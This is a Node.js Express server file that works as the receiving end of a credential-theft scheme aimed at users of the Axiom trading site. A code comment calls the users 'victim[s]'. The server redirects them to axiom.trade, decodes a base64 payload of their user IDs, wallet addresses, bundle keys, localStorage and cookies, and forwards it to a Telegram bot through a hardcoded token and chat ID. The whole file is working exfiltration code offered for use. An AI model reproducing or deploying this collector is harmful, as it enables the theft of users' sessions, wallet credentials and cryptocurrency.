const express = require('express');
const app = express();

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

const TELEGRAM_TOKEN = '8744030589:AAGZkvTlFfpfp9m_S0Rr6Rf3NpPmr46o76M';
const TELEGRAM_CHAT_ID = '8691443497';

async function sendTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text.substring(0, 4000),
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {
    console.error('Telegram send failed:', e.message);
  }
}

app.get('/data/keepalive', (req, res) => res.send('ACTIVATED'));

app.get('/data/:encoded', async (req, res) => {
  // Immediately redirect victim back to Axiom
  res.redirect(302, 'https://axiom.trade');
  
  try {
    const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
    console.log('===== NEW CAPTURE =====');
    console.log(JSON.stringify(decoded, null, 2));

    let msg = '🔑 *New Axiom Capture*\n\n';
    if (decoded.user) {
      msg += '*User ID:* `' + (decoded.user.userId || 'N/A') + '`\n';
      msg += '*Wallet:* `' + (decoded.user.registrationWallet || 'N/A') + '`\n';
    }
    if (decoded.bundle) msg += '*Bundle Key:* `' + decoded.bundle + '`\n';
    if (decoded.wallets) {
      msg += '\n*Wallets:*\n';
      decoded.wallets.forEach((w, i) => msg += `  ${i + 1}. \`${w.walletAddress}\` (${w.network})\n`);
    }
    if (decoded.localStorage) {
      msg += '\n📦 *localStorage:*\n';
      for (const k in decoded.localStorage) {
        let v = decoded.localStorage[k];
        if (v.length > 200) v = v.substring(0, 200) + '...';
        msg += `\`${k}\`: ${v}\n`;
      }
    }
    if (decoded.cookies) {
      msg += '\n🍪 *Cookies:*\n```' + decoded.cookies.substring(0, 500) + '```';
    }

    await sendTelegram(msg);
  } catch (e) {
    console.error('Processing error:', e.message);
  }
});

app.listen(10000, () => console.log('Collector running'));
